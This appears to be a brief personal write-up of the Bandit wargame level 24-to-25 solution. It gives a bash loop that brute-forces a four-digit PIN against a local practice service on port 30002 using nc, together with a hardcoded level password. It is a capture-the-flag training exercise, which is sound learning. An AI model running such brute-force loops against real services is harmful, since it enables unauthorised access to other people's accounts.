https://blogcompsci.wordpress.com/2014/11/25/bandit-level-24-%E2%86%92-level-25/

but I change it to:

#!/bin/bash

b24pass='UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
for i in {0..9}{0..9}{0..9}{0..9}; do
	timeout 1 bash -c "echo $b24pass' '$i | nc localhost 30002 >> /tmp/zhefeng_25_result"
done

Otherwise there could be a resource issue.

run it and wait for 1000s

sort zhefeng_25_result | uniq -u
=> Correct!
Exiting.
